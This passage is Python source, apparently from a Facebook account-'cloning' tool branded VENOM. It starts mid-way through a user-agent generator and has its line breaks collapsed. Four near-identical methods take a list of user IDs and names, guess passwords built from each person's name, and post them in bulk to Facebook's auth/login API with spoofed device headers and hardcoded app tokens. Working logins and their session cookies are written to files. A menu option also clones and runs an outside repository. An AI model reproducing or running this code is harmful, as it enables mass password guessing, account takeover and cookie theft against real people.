Telecom;FBMF/Realme;FBBD/Realme;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'+'[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162189;FBDM/{density=3.0,width=1080,height=2165};FBLC/it_IT;FBRV/526139383;FBCR/TIM;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/LE2113;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]'    ua14 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.2; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=4.0,width=1080,height=2412};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Nepal Telecom;FBMF/Realme;FBBD/Realme;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'+'[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'    ua15 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.2; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=4.0,width=1080,height=2412};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Nepal Telecom;FBMF/Realme;FBBD/Realme;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'+'[FBAN/FBIOS;FBAV/351.0.0.31.112;FBBV/346772752;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/14.8;FBSS/2;FBID/phone;FBLC/nl_NL;FBOP/5;FBRV/348600647]'    return random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua11,ua12,ua13,ua14,ua15])######___________user agent_________###########_______________&&&&&&&&&____#####try:    import bs4    from bs4 import BeautifulSoup as parsexcept ModuleNotFoundError:    os.system('pip install bs4')except Exception as e:    print(e)from concurrent.futures import ThreadPoolExecutor as tpeimport requestsfrom requests.exceptions import ConnectionError as CE##______COLORS____ARE________######pwx=[]W = '\033[97;1m'R = '\033[91;1m'G = '\033[92;1m'Y = '\033[93;1m'B = '\033[94;1m'P = '\033[95;1m'S = '\033[96;1m'N = '\x1b[0m'PURPLE ='\x1b[38;5;46m'RED = '\033[1;91m'WHITE = '\033[1;97m'GREEN = '\033[1;32m'YELLOW = '\033[1;33m'BLUE = '\033[1;34m'ORANGE = '\033[1;35m'BLACK="\033[1;30m"EXTRA ='\x1b[38;5;208m'os.system("clear")sim = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').replace('\n', '').replace(',', ' ➤ \x1b[1;92m')A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';SX = "{A}({R}+{A}) {A}"###########__________defline___________#############def line():    print(35*'•')def p(x):    print(x)#__________________ [ Lists Used in Script]______________id = []ok = []cp = []loop = 0method=[]SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"ses = requests.Session()#------------------[ SIM CODE  ]-------------------#try:    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')    carrier = output.replace(',', '\033[1;32m|\033[1;32m').replace('\n', '')except Exception as e:    pass    carrier = Nonedef logo():    os.system('clear')    logo = (f"""\r\r\x1b[1;97m{W}\033[1;32m  \033[1;30m _____             ______         \033[1;31m |  __ \     /\    |___  /   /\    \033[1;30m | |__) |   /  \      / /   /  \   \033[1;31m |  _  /   / /\ \    / /   / /\ \  \033[1;30m | | \ \  / ____ \  / /__ / ____ \  \033[1;31m|_|  \_\/_/    \_\/_____/_/    \_\  \033[1;37m-------------------------------------------------- \033[1;37m[•] AUTHOR     : \033[1;32mRAZA RATHOUR\033[1;37m \033[1;37m[•] GITHUB     : \033[1;32mRAZA -RATHOUR\033[1;37m \033[1;37m[•] GITHUB  : \033[1;32mhttps://github.com/RazaRathour/Raaz.git\033[1;37m \033[1;37m[•] TOOL TYPE  : \033[1;32mRANDOM & FILE\033[1;37m \033[1;37m[•] STATUS     : \033[1;32mFREE\033[1;37m \033[1;37m-------------------------------------------------- \033[1;37m[•] \033[1;37mVERSION    :\033[1;32m 1.0 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m \033[1;37m--------------------------------------------------""")    p(logo)def clear():    print('\033[1;32m----------------------------------------------')    os.system("clear")####_______________________&_______________############class iAmMain:    def __init__(self):        self.gp = "https://b-graph.facebook.com/auth/login"        self.ap = "https://b-api.facebook.com/auth/login"    def iAmMenu(self):        #heck_again()        logo()        p(" [1\033[1;37m] File Cloning ")        #p(" [2\033[1;37m] Create File ")        #p(" [3\033[1;37m] Cut Used Files Lines ")        p(" [E\033[1;37m] Exit Tool ")        line()        opt1 = input(" [•] Select An Option : ")        if opt1 == "1":self.file_menu()        if opt1 == "2":self.m_menu()        if opt1 == "3":self.dump_menu()        elif opt1 == "4":Grep().with_names()        elif opt1 == "5":Join().Whatsapp()        elif opt1 == "E":exit(" [•] Good Bye !!!!!!! ")        else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()########___________________FILE_dump__________#########    def dump_menu(self):        os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")        os.system('cd && cd FILE ;python FILE.py')########___________________FILE_Menu________############    def file_menu(self):        #check_again()        logo()        p(" [•] \033[1;37mExample \033[92;1m/sdcard/filename.txt\033[1;37m")        file = input(" [•] \033[1;37mPut File Path : ")        try:            id = open(file,"r").read().splitlines()            self.method_select(id)        except FileNotFoundError:            p(" [•] File Path Incorrect ")            sp(2);self.file_menu()            def method_select(self,id):        #check_again()        logo()        p(" [1] \033[1;37mMethod 1 ")        p (" [2] \033[1;37mMethod 2 ")        p (" [3] \033[1;37mMethod 3")        p (" [4] \033[1;37mMethod 4 ")        line()        m_opt = input(" [•] Choose : ")        if m_opt =='1':            method.append("i")            self.password_menu(id)        if m_opt =='2':            method.append('ii')            self.password_menu(id)        if m_opt =='3':            method.append('iii')            self.password_menu(id)        elif m_opt =="4":            method.append('iiii')            self.password_menu(id)        else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)    def password_menu(self,id):        #check_again()        pwx=[]        logo()        max = 20        p(" [•] Example 1 , 2 , 3  to 20 Max ")        try:            plimit = int(input(" [•] Put limit : "))            if plimit =="":                plimit = 4            elif plimit > max:                p(" [•] Password Limit Should under 20 ");sp(2);self.password_menu()        except:            plimit = 4        logo()        p(" [•] Enter Passwords :\033[92;1m firstlast First Last etc\033[1;37m")        line()        for n in range(plimit):            pwx.append(input(" [•] Put Password %s : "%(n+1)))        logo()        print(' \033[92;1m[\033[1;31m•\033[92;2m] SIM NAME   : \033[92;1m'+carrier+f' ')        p(" [•] Total Accounts : \033[92;1m%s "%(str(len(id))))        #p(" \033[97;1m[•] \033[1;37m[\033[1;92mON\033[1;97m/\033[1;91mOFF\033[1;97m] Airplane mode after 2 minutes \033[97;1m")         line()        with tpe(max_workers=30) as saqi:            for user in id:                uid = user.split("|")[0]                nm = user.split("|")[1]                if "i" in method:                    saqi.submit(self.method1,uid,nm,pwx)                elif "ii" in method:                    saqi.submit(self.method2,uid,nm,pwx)                elif "iii" in method:                    saqi.submit(self.method3,uid,nm,pwx)                elif "iiii" in method:                    saqi.submit(self.method4,uid,nm,pwx)        self.saved_results(ok,cp)    def saved_results(self,ok,cp):        line()        p(" [•] Cloning Has been Completed ")        p(" [•] Total Ok Accounts : %s "%(len(ok)))        p(" [•] Total Cp Accounts : %s "%(len(cp)))        line()        input(" [•] Press Enter To Go Back ")        self.iAmMenu()#####______________mtha1_________________##########    def method1(self,uid,nm,pwx):        try:            global ok , cp , loop            sys.stdout.write('\r\033[94;1m[\033[97;2mVENOM_M1\033[94;1m]\033[97;1m %s | \033[94;1mM1 \033[92;1mOK\033[97;1m/\033[91;1mCP \033[92;1m%s\033[97;1m/\033[91;1m%s\033[97;1m '%(loop,len(ok),len(cp)));sys.stdout.flush()            fn = nm.split(' ')[0]            try:                ln = nm.split(' ')[1]            except:                ln = fn            for ps in pwx:                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())                data = {"adid": str(uuid.uuid4()),                    "format": "json",                    "device_id": str(uuid.uuid4()),                    "cpl": "true",                    "family_device_id": str(uuid.uuid4()),                    "credentials_type": "device_based_login_password",                    "error_detail_type": "button_with_disabled",                    "source": "device_based_login",                    "email": uid,                    "password": pw,                    "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",                    "generate_session_cookies": "1",                    "meta_inf_fbmeta": "",                    "advertiser_id": str(uuid.uuid4()),                    "currently_logged_in_userid": "0",                    "locale": "fr_GB",                    "client_country_code": "GB",                    "method": "auth.login",                    "fb_api_req_friendly_name": "authenticate",                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",                    "api_key": "882a8490361da98702bf97a021ddc14d"}                headers = {'User-Agent': sex(),                    'Content-Type': 'application/x-www-form-urlencoded',                    'Host': 'graph.facebook.com',                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),                    'X-FB-Connection-Type': 'MOBILE.LTE',                    'X-Tigon-Is-Retry': 'False',                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',                    'x-fb-device-group': '5120',                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',                    'X-FB-Request-Analytics-Tags': 'graphservice',                    'X-FB-HTTP-Engine': 'Liger',                    'X-FB-Client-IP': 'True',                    'X-FB-Server-Cluster': 'True',                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()                if "session_key" in q:                    print('\r\033[1;92m[\033[1;97mVENOM-OK\033[1;92m] %s | %s \033[1;97m '%(uid,pw));os.system('espeak -a 300 "ok id"')                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={cok};{ckkk}"                    ok.append(uid)                    open('/sdcard/venom_OK.txt','a').write(uid+'|'+pw+'\n')                    open('/sdcard/venom_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')                    break                elif 'www.facebook.com' in q['error']['message']:                    print('\r\033[1;92m[\033[1;97mVENOM-CP\033[1;91m] %s | %s \033[1;97m '%(uid,pw));os.system('espeak -a 300 "cp id"')                    cp.append(uid)                    open('/sdcard/venom_M1_CP.txt','a').write(uid+'|'+pw+'\n')                    break                else:                    continue            loop+=1        except requests.exceptions.ConnectionError:            self.method1(uid,nm,pwx)        except Exception as e:            self.method1(uid,nm,pwx)#####_____________method2_________#####    def method2(self,uid,nm,pwx):        try:            global ok , cp , loop            sys.stdout.write('\r\033[94;1m[\033[97;2mVENOM-M2\033[94;1m]\033[97;1m %s | \033[94;1mM2 \033[92;1mOK\033[97;1m/\033[91;1mCP \033[92;1m%s\033[97;1m/\033[91;1m%s\033[97;1m '%(loop,len(ok),len(cp)));sys.stdout.flush()            fn = nm.split(' ')[0]            try:                ln = nm.split(' ')[1]            except:                ln = fn            for ps in pwx:                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())                data = {"adid": str(uuid.uuid4()),                        "format": "json",                        "device_id": str(uuid.uuid4()),                        "cpl": "true",                        "family_device_id": str(uuid.uuid4()),                        "credentials_type": "device_based_login_password",                        "error_detail_type": "button_with_disabled",                        "source": "register_api",                        "email": uid,                        "password": pw,                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",                        "generate_session_cookies": "1",                        "meta_inf_fbmeta": "",                        "advertiser_id": str(uuid.uuid4()),                        "currently_logged_in_userid": "0",                        "locale": "en_DZ",                        "client_country_code": "DZ",                        "method": "auth.login",                        "fb_api_req_friendly_name": "authenticate",                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",                        "api_key": "882a8490361da98702bf97a021ddc14d"}                headers = {'User-Agent': get_random_user_agent(),                        'Content-Type': 'application/x-www-form-urlencoded',                        'Host': 'graph.facebook.com',                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),                        'X-FB-Connection-Type': f'{SEX}',                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',                        'X-FB-Connection-Quality': f'{SEX}',                        'X-Tigon-Is-Retry': 'False',                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',                        'x-fb-device-group': '5120',                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',                        'X-FB-Request-Analytics-Tags': 'graphservice',                        'X-FB-HTTP-Engine': 'Liger',                        'X-FB-Client-IP': 'True',                        'X-FB-Server-Cluster': 'True',                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()                if "session_key" in q:                    print('\r\033[1;92m[\033[1;97mVENOM-OK\033[1;92m] %s | %s \033[1;97m '%(uid,pw));os.system('espeak -a 300 "ok id"')                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={cok};{ckkk}"                    ok.append(uid)                    open('/sdcard/VENOM_OK.txt','a').write(uid+'|'+pw+'\n')                    open('/sdcard/VENOM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')                    break                elif 'www.facebook.com' in q['error']['message']:                    print('\r\033[1;91m[\033[1;97mVENOM-CP\033[1;91m] %s | %s \033[1;97m '%(uid,pw));os.system('espeak -a 300 "cp id"')                    cp.append(uid)                    open('/sdcard/VENOM_M2_CP.txt','a').write(uid+'|'+pw+'\n')                    break                else:                    continue            loop+=1        except requests.exceptions.ConnectionError:            self.method2(uid,nm,pwx)        except Exception as e:            self.method2(uid,nm,pwx)#####______________mtha3_________________##########    def method3(self,uid,nm,pwx):        try:            global ok , cp , loop            sys.stdout.write('\r\033[94;1m[\033[97;1mVENOM-M3\033[94;1m]\033[97;1m %s | \033[94;1mM3 \033[92;1mOK\033[97;1m/\033[91;1mCP \033[92;1m%s\033[97;1m/\033[91;1m%s\033[97;1m '%(loop,len(ok),len(cp)));sys.stdout.flush()            fn = nm.split(' ')[0]            try:                ln = nm.split(' ')[1]            except:                ln = fn            for ps in pwx:                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())                data =  {'adid': str(uuid.uuid4()),                         'email': uid,                         'password': pw,                         'cpl': 'true',                         'credentials_type': 'password',                         'error_detail_type': 'button_with_disabled',                         'source': 'register_api',                         'format': 'json',                         'device_id': str(uuid.uuid4()),                         'family_device_id': str(uuid.uuid4()),                         'generate_session_cookies': '1',                         'generate_analytics_claim': '1',                         'generate_machine_id': '1',                         'tier': 'regular',                         'device': 'null',                         'os_ver': '8.1',                         'carrier': 'Telenor',                         'app_id': '350685531728',                         'app_ver': '918.892.73.972.912',                         'locale': 'en_US',                         'advertising_id': str(uuid.uuid4()),                         'fb_api_req_friendly_name': 'authenticate'}                headers = {'User-Agent': R_UA(),                              'Accept-Encoding': 'gzip, deflate',                              'Accept': '*/*', 'connection': 'keep-alive',                              'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',                              'x-fb-connection-bandwidth': '25718666',                              'x-fb-sim-hni': '38280',                              'x-fb-net-hni': '30369',                              'X-FB-Connection-Quality': 'GOOD',                              'X-FB-Connection-Type': 'unknown',                              'content-encoding': 'gzip,deflate',                              'content-type': 'application/x-www-form-urlencoded',                              'x-fb-http-engine': 'Liger',                              'Content-Length': '566'}                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()                if "session_key" in q:                    print('\r\033[1;92m[\033[1;97mVENOM-OK\033[1;92m] %s | %s \033[1;97m '%(uid,pw));os.system('espeak -a 300 "ok id"')                    os.system('espeak -a 300 " Crack,   Ok,"')                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={cok};{ckkk}"                    ok.append(uid)                    open('/sdcard/VENOM_OK.txt','a').write(uid+'|'+pw+'\n')                    open('/sdcard/VENOM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')                    break                elif 'www.facebook.com' in q['error']['message']:                    print('\r\033[1;91m[\033[1;97mVENOM-CP\033[1;91m] %s | %s \033[1;97m '%(uid,pw));os.system('espeak -a 300 "cp id"')                    cp.append(uid)                    open('/sdcard/VENOM_M3_CP.txt','a').write(uid+'|'+pw+'\n')                    break                else:                    continue            loop+=1        except requests.exceptions.ConnectionError:            self.method3(uid,nm,pwx)        except Exception as e:            self.method3(uid,nm,pwx)   #####_____________method4_________#####    def method4(self,uid,nm,pwx):        try:            global ok , cp , loop            sys.stdout.write('\r [VENOM-XD] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()            fn = nm.split(' ')[0]            try:                ln = nm.split(' ')[1]            except:                ln = fn            for ps in pwx:                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())                data = {"adid": str(uuid.uuid4()),                        "format": "json",                        "device_id": str(uuid.uuid4()),                        "cpl": "true",                        "family_device_id": str(uuid.uuid4()),                        "credentials_type": "device_based_login_password",                        "error_detail_type": "button_with_disabled",                        "source": "register_api",                        "email": uid,                        "password": pw,                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",                        "generate_session_cookies": "1",                        "meta_inf_fbmeta": "",                        "advertiser_id": str(uuid.uuid4()),                        "currently_logged_in_userid": "0",                        "locale": "en_US",                        "client_country_code": "US",                        "method": "auth.login",                        "fb_api_req_friendly_name": "authenticate",                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",                        "api_key": "882a8490361da98702bf97a021ddc14d"}                headers = {'User-Agent': __UBI___(),                        'Content-Type': 'application/x-www-form-urlencoded',                        'Host': 'graph.facebook.com',                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),                        'X-FB-Connection-Type': f'{SEX}',                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',                        'X-FB-Connection-Quality': f'{SEX}',                        'X-Tigon-Is-Retry': 'False',                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',                        'x-fb-device-group': '5120',                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',                        'X-FB-Request-Analytics-Tags': 'graphservice',                        'X-FB-HTTP-Engine': 'Liger',                        'X-FB-Client-IP': 'True',                        'X-FB-Server-Cluster': 'True',                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()                if "session_key" in q:                    print('\r\033[1;92m[VENOM-OK] %s | %s \033[1;97m '%(uid,pw));os.system('espeak -a 300 "ok id"')                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={cok};{ckkk}"                    ok.append(uid)                    open('/sdcard/VENOM_OK.txt','a').write(uid+'|'+pw+'\n')                    open('/sdcard/VENOM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')                    break                elif 'www.facebook.com' in q['error']['message']:                    print('\r\033[1;91m[VENOM-CP] %s | %s \033[1;97m '%(uid,pw));os.system('espeak -a 300 "cp id"')                    cp.append(uid)                    open('/sdcard/VENOM_M4_CP.txt','a').write(uid+'|'+pw+'\n')                    break                else:                    continue            loop+=1        except requests.exceptions.ConnectionError:            self.method4(uid,nm,pwx)        except Exception as e:            self.method4(uid,nm,pwx)         #######_________________join________&#########class Join:    def Whatsapp(self):        os.system('xdg-open https://www.facebook.com/copnrt.03')        iAmMain().iAmMenu()#######___________________Name_____________#######class Grep:    def __init__(self):        self.url = "https://free.facebook.com"    def with_names(self):        clear()        logo()        lines=[]        p(" [•] Ex : /sdcard/file.txt")        try:            file = input(" [•] Put File Path : ")        except Exception as e:            print(" [•] File Path Incorrect!! ");sp(2);self.used_cutter()        digit= int(input(" [•] Put Line Num :"))        with open(file,"r") as r:            lines = r.readlines()        with open(file,"w") as w:            for num,line in enumerate(lines):                if num >= digit:                    w.write(line)        p(" [•] File  Complete")        input(" [•] Press Enter to go back ")        iAmMain().iAmMenu()if __name__=="__main__":    iAmMain().iAmMenu()##########________END__________#########